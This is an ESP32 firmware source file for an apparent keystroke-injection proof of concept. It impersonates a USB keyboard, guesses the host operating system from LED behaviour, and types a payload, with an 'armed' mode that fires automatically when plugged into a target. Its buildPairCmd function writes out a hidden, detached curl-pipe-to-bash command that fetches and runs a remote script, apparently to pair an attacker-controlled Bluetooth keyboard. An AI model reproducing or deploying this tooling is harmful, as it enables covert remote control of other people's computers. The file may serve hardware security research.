// USB-HID -> BLE-HID pairing-bootstrap PoC. One codebase, two boards (build flags).
// Start MENU picks the target OS (or Autodetect). Single button:
//   CLICK = next item, HOLD = select.
//   Autodetect -> LED-fingerprint the host, then run that OS's payload.
//   Linux / Windows / macOS -> force that OS's payload (skips detection).
// On the T-Embed the payload is TYPED over USB HID; on the C5 (no USB-OTG) the
// Linux command is shown on screen to run manually. Typing text + device
// management is on the phone web page.
#include <Arduino.h>
#include "usb_hid.h"
#include "ble_hid.h"
#include "display.h"
#include "netota.h"
#include <Wire.h>
#include "esp_sleep.h"
#include "driver/rtc_io.h"

#if defined(POC_BOARD_TEMBED)
#define POC_BOARD_NAME "T-Embed CC1101"
#elif defined(POC_BOARD_TDONGLE)
#define POC_BOARD_NAME "T-Dongle S3"
#else
#error "define POC_BOARD_TEMBED or POC_BOARD_TDONGLE"
#endif

static const int BTN = 0;    // GPIO0: T-Embed encoder push / T-Dongle button (also BOOT)

static bool     lastBtn = HIGH;
static uint32_t pressStart = 0;
static bool     firedLong = false;
static int      sel = 0;
static uint32_t menuAt = 0;   // T-Embed: >0 = auto-return to the menu at this millis() after a send

#if defined(POC_BOARD_TDONGLE)
// T-Dongle is USB-powered (no battery), so deep sleep is pointless — drop it (also
// keeps the menu to 4 rows so nothing falls under the status bar on the 80px screen).
static const char* ITEMS[] = { "Autodetect", "Linux", "Windows", "Macos" };
static const int   NITEMS = 4;
#else
static const char* ITEMS[] = { "Autodetect", "Linux", "Windows", "Macos", "Sleep" };
static const int   NITEMS = 5;
#endif
static const int   OS_OF[] = { POC_OS_UNKNOWN, POC_OS_LINUX, POC_OS_WINDOWS, POC_OS_MACOS };
#if defined(POC_BOARD_TDONGLE)
#define SLEEP_IDX (-1)  // no sleep item on the T-Dongle (USB-powered)
#else
#define SLEEP_IDX 4     // last menu item = deep sleep (wake with the button)
#endif

#ifdef POC_HAS_USB_HID
extern "C" bool tud_mounted(void);
extern "C" bool tud_suspended(void);
// Mounted AND bus active. On unplug the S3 often keeps tud_mounted() true (no VBUS
// sense), but the bus suspends (no SOF) so tud_suspended() flips -> this goes
// false. (A host that suspends us while still attached also reads as absent.)
static bool usbHost() { return tud_mounted() && !tud_suspended(); }
#else
static bool usbHost() { return false; }
#endif
#ifdef POC_HAS_USB_HID
static bool armed = false; static int armedIdx = 0; static bool wasMounted = false;   // AUTORUN arming
static uint32_t fireAt = 0;                                    // fire this long after a plug (host settle)
#endif

// Battery %: BQ27220 fuel gauge over I2C (T-Embed only), cached ~10s. -1 = none.
#if defined(POC_BOARD_TEMBED)
static int batteryPct() {
    static int cached = -1; static uint32_t last = 0; static bool probed = false, present = false;
    if (probed && millis() - last < 10000) return cached;
    last = millis();
    if (!probed) { probed = true; Wire.begin(8, 18); Wire.beginTransmission(0x55); present = (Wire.endTransmission() == 0); }
    if (!present) { cached = -1; return cached; }
    Wire.beginTransmission(0x55); Wire.write(0x2C);              // StateOfCharge (%)
    if (Wire.endTransmission(false) != 0) { cached = -1; return cached; }
    if (Wire.requestFrom(0x55, 2) != 2)   { cached = -1; return cached; }
    uint8_t lo = Wire.read(), hi = Wire.read(); uint16_t soc = lo | (hi << 8);
    cached = (soc <= 100) ? (int)soc : -1;
    return cached;
}
#else
static int batteryPct() { return -1; }
#endif

static void statusBar() { dispBle(bleHidConnected(), bleHidPhone(), usbHost(), bleAutorun(), bleArmBoot(), bleTargetOs(), batteryPct(), bleHidConnCount()); }

static void drawMenu() {
    dispMenu("SELECT OS", ITEMS, NITEMS, sel);
    statusBar();
}

static void buildPairCmd(char* out, size_t n) {
    snprintf(out, n,
        "nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s %s'"
        " >/dev/null 2>&1 & disown; exit", bleHidMac());
}

// Actually deliver the payload for the chosen menu item.
static void fireOS(int menuIdx) {
    int os = OS_OF[menuIdx];
#ifdef POC_HAS_USB_HID
    if (menuIdx == 0) {   // Autodetect
        dispShow("DETECTING", "LED fingerprint...", 0xF7C948); statusBar();
        os = usbDetectOS();
    }
    char h[40]; snprintf(h, sizeof(h), "%s", (menuIdx == 0) ? usbOsName(os) : ITEMS[menuIdx]);
    dispShow(h, "typing the pairing\npayload...", 0xF7C948); statusBar();
    { char nb[56]; snprintf(nb, sizeof(nb), "usb: firing %s payload (board)", h); bleHidNotify(nb); }
    usbSamplePayload(os);
    bleHidNotify("usb: sent");
    dispShow("SENT", "payload typed.\nclick = menu", 0x3FB950); statusBar();
    menuAt = millis() + 4000;   // auto-return to the menu after a few seconds
#else
    // C5: no USB typing. Only the Linux helper exists; show it, else a note.
    if (os == POC_OS_LINUX || menuIdx == 0) {
        char cmd[420]; buildPairCmd(cmd, sizeof(cmd));
        dispCmd("RUN ON PC (Linux):", cmd); statusBar();
    } else {
        dispShow(ITEMS[menuIdx], "no helper for this\nOS yet (Linux only)", 0xF7C948); statusBar();
    }
#endif
}

// Deep sleep: boots fresh (setup runs) on the next button tap. GPIO0 is RTC-
// capable on the S3, so a press wakes it via ext1.
static void deepSleep() {
    dispShow("SLEEP", "press the button\nto wake", 0x8A97A2);
    delay(700);
    while (digitalRead(BTN) == LOW) delay(10);     // wait for the select-hold to release
    dispOff();                                     // backlight off + panel sleep
    rtc_gpio_pullup_en(GPIO_NUM_0); rtc_gpio_pulldown_dis(GPIO_NUM_0);
    esp_sleep_enable_ext1_wakeup(1ULL << 0, ESP_EXT1_WAKEUP_ANY_LOW);
    esp_deep_sleep_start();
    // Only reached if deep sleep didn't engage (e.g. USB attached keeps it awake):
    // bring the display back so we never sit dark with the app still running.
    dispOn(); drawMenu();
}

// Select the highlighted item. Manual (default): fire now. Autorun: arm + wait.
static void selectOS(int menuIdx) {
    if (menuIdx == SLEEP_IDX) { deepSleep(); return; }   // last item = sleep
#ifdef POC_HAS_USB_HID
    if (bleAutorun()) {                              // arm, then auto-fire on a plug
        armed = true; armedIdx = menuIdx; wasMounted = tud_mounted();
        char b[64]; snprintf(b, sizeof(b), "armed: %s\nplug into target\nto auto-fire", ITEMS[menuIdx]);
        dispShow("ARMED", b, 0xF7C948); statusBar();
        return;
    }
#endif
    fireOS(menuIdx);
}

void setup() {
    pinMode(BTN, INPUT_PULLUP);
#if defined(POC_BOARD_TEMBED)
    pinMode(15, OUTPUT); digitalWrite(15, HIGH);   // BOARD_PWR_EN: power the display rail
    // Deselect the other devices on the SHARED display SPI bus, or their floating
    // CS lines corrupt the display's command stream (random invert/blank glitches).
    pinMode(12, OUTPUT); digitalWrite(12, HIGH);   // CC1101 radio CS
    pinMode(13, OUTPUT); digitalWrite(13, HIGH);   // microSD CS
#endif
    Serial.begin(115200);
    dispBegin();
    dispSplash(netVersion(), POC_BOARD_NAME);                   // graphical boot splash
    usbHidBegin();
    bleHidBegin();
    netBegin();                         // reconnect WiFi if creds were saved (for OTA)
    delay(1200);                        // keep the splash up briefly
#ifdef POC_HAS_USB_HID
    if (bleArmBoot()) {                 // headless: auto-arm the configured OS, wait for a plug
        armedIdx = bleTargetOs(); sel = armedIdx; armed = true; wasMounted = false;
        char b[80]; snprintf(b, sizeof(b), "%s\nplug into a host\nto auto-fire", ITEMS[armedIdx]);
        dispShow("ARMED", b, 0xF7C948); statusBar();
    } else drawMenu();
#else
    drawMenu();
#endif
    Serial.printf("[poc] ready v%s. BLE MAC = %s\n", netVersion(), bleHidMac());
}

void loop() {
    bleHidTick();

    bool b = digitalRead(BTN);
    if (b == LOW && lastBtn == HIGH) { pressStart = millis(); firedLong = false; }
    if (b == LOW && !firedLong && millis() - pressStart > 800) { firedLong = true; Serial.printf("[btn] hold-select sel=%d\n", sel); selectOS(sel); }  // HOLD = select
    if (b == HIGH && lastBtn == LOW) {                                                                // release
        uint32_t held = millis() - pressStart;
        if (!firedLong && held > 40 && held < 700) {                                                  // CLICK
            if (menuAt) { menuAt = 0; drawMenu(); }                    // post-send: click = back to menu
            else { sel = (sel + 1) % NITEMS; drawMenu(); }            // in menu: click = next item
        }
    }
    lastBtn = b;

    if (menuAt && (int32_t)(millis() - menuAt) >= 0) { menuAt = 0; drawMenu(); }   // auto-return to menu

#ifdef POC_HAS_USB_HID
    if (armed) {                                   // AUTORUN: fire on a fresh plug into a host
        bool m = tud_mounted();
        if (m && !wasMounted) fireAt = millis() + bleFireDelay();  // let the host's HID stack settle
        if (!m) fireAt = 0;                                        // else the first keystrokes drop
        if (fireAt && millis() >= fireAt) { fireAt = 0; armed = false; fireOS(armedIdx); }
        wasMounted = m;
    }
#endif

    static uint32_t t = 0;
    if (millis() - t > 800) { t = millis();
        statusBar();
        Serial.printf("[poc] pc=%s phone=%s conns=%d\n", bleHidConnected() ? "on" : "off", bleHidPhone() ? "on" : "off", bleHidConnCount());
    }
    delay(10);
}
